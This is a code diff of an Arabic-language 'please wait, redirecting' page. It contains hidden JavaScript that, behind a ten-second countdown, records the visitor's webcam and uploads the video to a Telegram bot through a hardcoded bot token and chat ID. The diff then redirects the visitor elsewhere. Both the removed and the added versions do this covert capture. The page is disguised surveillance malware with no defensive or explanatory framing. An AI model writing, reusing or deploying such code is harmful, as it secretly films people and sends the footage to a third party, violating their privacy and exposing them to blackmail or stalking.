@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الرجاء الانتظار</title>
+    <title>جاري التحميل...</title>
     <style>
         body {
             display: flex;
@@ -11,90 +11,109 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
-            background-color: #fafafa;
+            background-color: #f0f0f0;
             font-family: Arial, sans-serif;
             direction: rtl;
             text-align: center;
-            color: #333;
         }
-        #timerCircle {
-            width: 100px;
-            height: 100px;
+        #countdown-container {
+            position: relative;
+            width: 150px;
+            height: 150px;
             border-radius: 50%;
-            border: 10px solid #4CAF50;
+            background-color: #ddd;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 24px;
-            color: #4CAF50;
-            margin-bottom: 20px;
+            color: #333;
         }
-        .message {
-            font-size: 18px;
+        #progress {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            clip: rect(0px, 150px, 150px, 75px);
+            background-color: #4CAF50;
         }
     </style>
 </head>
 <body>
-    <div id="timerCircle">10</div>
-    <div class="message">الرجاء الانتظار، سيتم نقلك تلقائيًا بعد 10 ثوانٍ</div>
+    <div>الرجاء الانتظار، سيتم الانتقال تلقائيًا خلال 10 ثوانٍ</div>
+    <div id="countdown-container">
+        <div id="progress"></div>
+        <span id="countdown">10</span>
+    </div>
 
     <script>
         const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
         const chatId = '6185375878';
         let countdown = 10;
-        const timerCircle = document.getElementById("timerCircle");
+        let recordedVideoBlob;
 
-        let videoChunks = [];
+        // بدء العداد وتسجيل الفيديو
+        function startCountdown() {
+            const countdownElement = document.getElementById('countdown');
+            const progressElement = document.getElementById('progress');
+            let angle = 0;
 
-        // بدء تسجيل الفيديو
-        async function startRecording() {
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                angle += 36; // زاوية التقدم لكل ثانية (360 درجة ÷ 10 ثوانٍ)
+                countdownElement.innerText = countdown;
+
+                // تحديث شكل التقدم
+                progressElement.style.transform = `rotate(${angle}deg)`;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    sendVideoToTelegram();
+                    window.location.href = "finalPage.html";
+                }
+            }, 1000);
+
+            startVideoRecording();
+        }
+
+        // تسجيل الفيديو لمدة 10 ثوانٍ
+        async function startVideoRecording() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const recorder = new MediaRecorder(stream);
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
 
-                recorder.ondataavailable = e => videoChunks.push(e.data);
-                recorder.start();
+                mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
+                mediaRecorder.onstop = () => {
+                    recordedVideoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا بعد التسجيل
+                };
 
-                // إنهاء التسجيل بعد 10 ثوانٍ
-                setTimeout(() => {
-                    recorder.stop();
-                    stream.getTracks().forEach(track => track.stop());
-                }, 10000);
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 10000); // التسجيل لمدة 10 ثوانٍ
             } catch (error) {
-                console.error('خطأ في الوصول إلى الكاميرا:', error);
+                console.error('خطأ في تسجيل الفيديو:', error);
             }
         }
 
-        // بدء العد التنازلي
-        function startCountdown() {
-            const interval = setInterval(() => {
-                countdown--;
-                timerCircle.textContent = countdown;
+        // إرسال الفيديو إلى Telegram
+        function sendVideoToTelegram() {
+            if (recordedVideoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('video', recordedVideoBlob, 'recording.mp4');
+                formData.append('caption', '📹 تسجيل الفيديو لمدة 10 ثوانٍ');
 
-                if (countdown <= 0) {
-                    clearInterval(interval);
-                    sendVideoAndRedirect();
-                }
-            }, 1000);
+                fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                }).then(response => response.json())
+                  .then(data => console.log('تم إرسال الفيديو إلى Telegram:', data))
+                  .catch(error => console.error('خطأ في إرسال الفيديو إلى Telegram:', error));
+            }
         }
 
-        // إرسال الفيديو والانتقال للصفحة النهائية
-        function sendVideoAndRedirect() {
-            const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('video', videoBlob, 'video.webm');
-            formData.append('caption', '📹 فيديو تم تسجيله أثناء فترة الانتظار لمدة 10 ثوانٍ.');
-
-            fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(() => window.location.href = "finalPage.html")
-            .catch(error => console.error('خطأ في إرسال الفيديو:', error));
-        }
-
-        startRecording();
         startCountdown();
     </script>
 </body>
